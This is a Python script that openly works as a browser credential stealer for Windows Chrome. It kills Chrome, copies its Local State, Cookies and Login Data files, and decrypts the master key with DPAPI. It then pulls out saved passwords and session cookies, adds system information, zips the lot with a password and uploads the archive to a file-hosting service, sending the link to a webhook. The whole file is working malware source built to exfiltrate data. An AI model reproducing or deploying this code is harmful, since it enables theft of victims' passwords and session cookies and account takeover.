import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import win32crypt
import shutil
import time 
import platform
import pyzipper
import requests
 
webhookURL = ""
 
 
def zip_file(folder_path, output_zip_file, password):
    try:
        with pyzipper.AESZipFile(output_zip_file, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zipf:
            zipf.setpassword(password.encode())
            
            for foldername, subfolders, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(foldername, filename)
                    zipf.write(file_path, os.path.relpath(file_path, folder_path))
 
        print(f'Successfully created password-protected ZIP file: {output_zip_file}')
    except Exception as e:
        print(f'Error: {e}')
 
class Paths:
    local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
    cookies_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies')
    logindata_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
 
    temp_path = os.path.join(os.environ['TEMP'], 'shenanigans')
 
    stealerLog = os.path.join(os.environ['TEMP'], 'shenanigans', 'LOG')
    
    localState = os.path.join(os.environ['TEMP'], 'shenanigans', 'Local State.db')
    cookiesFile = os.path.join(os.environ['TEMP'], 'shenanigans', 'Cookies.db')
    loginData = os.path.join(os.environ['TEMP'], 'shenanigans', 'Login Data.db')
 
class Functions:
    def Initialize():
        os.system("taskkill /f /im chrome.exe")
        time.sleep(1)
        os.makedirs(Paths.temp_path, exist_ok=True)
        os.makedirs(Paths.stealerLog, exist_ok=True)
 
        try:
            shutil.copy(Paths.local_state_path, Paths.temp_path)
            shutil.copy(Paths.cookies_path, Paths.temp_path)
            shutil.copy(Paths.logindata_path, Paths.temp_path)
 
            files = os.listdir(Paths.temp_path)
 
            for filename in files:
                if filename == 'Local State' or filename == 'Cookies' or filename =="Login Data":
                    new_filename = os.path.splitext(filename)[0] + '.db'
                    old_path = os.path.join(Paths.temp_path, filename)
                    new_path = os.path.join(Paths.temp_path, new_filename)
                    os.rename(old_path, new_path)
 
            print("Files copied and renamed successfully.")
        except Exception as e:
            print(f"Error copying/renaming files: {e}")
 
 
    def getMasterKey():
        masterKeyJSON = json.loads(open(Paths.localState).read())
        key = base64.b64decode(masterKeyJSON["os_crypt"]["encrypted_key"])[5:]
        
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    
    def decrypt(key, password):
        try:
            iv = password[3:15]
            passw = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(passw)[:-16].decode()
 
        except Exception as e:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""
 
class StealerFunctions:
    def stealPass():
        stolenData = []
        key = Functions.getMasterKey()
 
        conn = sqlite3.connect(Paths.loginData)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM logins")
        data = cursor.fetchall()
 
        for i in data:
            originURL = i[0]
            actionURL = i[1]
            signon_realm = str(i[7])
            user = i[3]
            password = Functions.decrypt(key, i[5])
 
            stolenData.append(f"Origin URL: {originURL}\nAction URL: {actionURL}\nSingon_realm: {signon_realm}\nUsername: {user}\nPassword: {password}")
 
        conn.close()
        return '\n\n'.join(stolenData)
    
    def stealCookies():
        key = Functions.getMasterKey()
        conn = sqlite3.connect(Paths.cookiesFile)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM cookies")
        data = cursor.fetchall()
 
        netscape_cookies = []
 
        for i in data:
            host_key = i[1]
            name = i[3]
            value = Functions.decrypt(key, i[5])
            expires = i[7]
            path = i[6] 
            if (i[8] == 1):
                secure = 'TRUE'
            else:
                secure = 'FALSE'
 
            if (i[9] == 1):
                httponly = 'TRUE'
            else:
                httponly = 'FALSE'
 
            cookie_string = f"{host_key}\t{secure}\t{path}\t{httponly}\t{expires}\t{name}\t{value}"
            netscape_cookies.append(cookie_string)
 
        conn.close()
        return '\n'.join(netscape_cookies)
 
    def getSysInfo():
        data = []
        system_info = platform.uname()
 
        data.append(f"OS: {system_info[0]} {system_info[2]} {system_info[3]} {system_info[4]}")
        data.append(f"Name: {system_info[1]}")
        data.append(f"CPU:  {platform.processor()}")
 
        return '\n'.join(data)
    
    def createLog(passw, sysinfo, cookies):
        print("hi")
        with open(os.path.join(Paths.stealerLog, "cookies.txt"), "w") as file:
            file.write(cookies)
        with open(os.path.join(Paths.stealerLog, "passwords.txt"), "w") as file:
            file.write(passw)
        with open(os.path.join(Paths.stealerLog, "system.txt"), "w") as file:
            file.write(sysinfo)
 
    def uploadLog():
        file_path = os.path.join(Paths.temp_path, "StaySilent.zip")
 
        files = {'file': ('StaySilent.zip', open(file_path, 'rb'))}
 
        response = requests.post('https://store1.gofile.io/uploadFile', files=files)
 
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'ok':
                return data['data']['downloadPage']
            else:
                print(f"Error: {response.status_code}")
                print(response.text)
 
 
if __name__ == "_main_":
    Functions.Initialize()
 
    cookies = StealerFunctions.stealCookies()
    passwords = StealerFunctions.stealPass()
    systemInfo = StealerFunctions.getSysInfo()
 
    StealerFunctions.createLog(passwords, systemInfo, cookies)
    zip_file(Paths.stealerLog, os.path.join(Paths.temp_path, "StaySilent.zip"), "ZIPPASSWORD")
    requests.post(webhookURL, data={"content": StealerFunctions.uploadLog()})